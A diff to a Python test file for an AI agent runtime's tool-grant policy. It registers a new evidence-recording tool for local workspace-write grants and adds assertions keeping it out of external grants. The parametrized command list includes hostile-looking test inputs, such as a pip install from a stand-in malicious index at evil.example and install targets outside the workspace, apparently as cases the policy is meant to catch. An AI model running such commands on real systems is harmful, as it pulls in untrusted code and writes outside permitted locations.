@@ -13,7 +13,7 @@ def test_local_grants_are_registered_workspace_tools_only():
     grants = set(policy.local_runtime_tool_grants("workspace_write"))
     assert {"cli_tool", "exec_command", "write_stdin", "read_file_tool",
             "write_file_tool", "apply_diff_edit_tool", "apply_patch_tool",
-            "grep_search_tool", "glob_tool"} == grants
+            "grep_search_tool", "glob_tool", "record_local_reuse_evidence_tool"} == grants
     assert grants <= TOOL_CATALOG.keys()
     assert not grants & {"web_search_tool", "web_fetch_tool", "clean_workspace_debris_tool",
                          "agent_message_tool", "unified_memory_search_tool",
@@ -21,6 +21,8 @@ def test_local_grants_are_registered_workspace_tools_only():
     read_only = set(policy.local_runtime_tool_grants("read_only"))
     assert read_only == {"grep_search_tool", "glob_tool", "read_file_tool"}
     assert external_runtime_tool_grants("workspace_write") == external_before
+    assert "record_local_reuse_evidence_tool" not in external_before
+    assert "record_local_reuse_evidence_tool" not in external_runtime_tool_grants("full_access")
     assert not read_only & {"write_file_tool", "apply_diff_edit_tool", "apply_patch_tool"}
     assert policy.LOCAL_RUNTIME_SOURCE_PREFIX == "launcher_assistant_task:"
     with pytest.raises(ValueError):
@@ -75,6 +77,7 @@ def test_native_file_tool_does_not_grant_win32_device_names(tmp_path, path):
     "python -m pip install -r requirements.txt",
     "python -m pip install --upgrade --quiet --no-input requests",
     "python -m pip uninstall requests",
+    "python scripts/reuse_research_evidence.py record --help",
     "python -m pip install --target C:/Windows/tooling requests",
     "python -m pip install --target ../outside requests",
     "python -m pip install -i https://evil.example/simple requests",
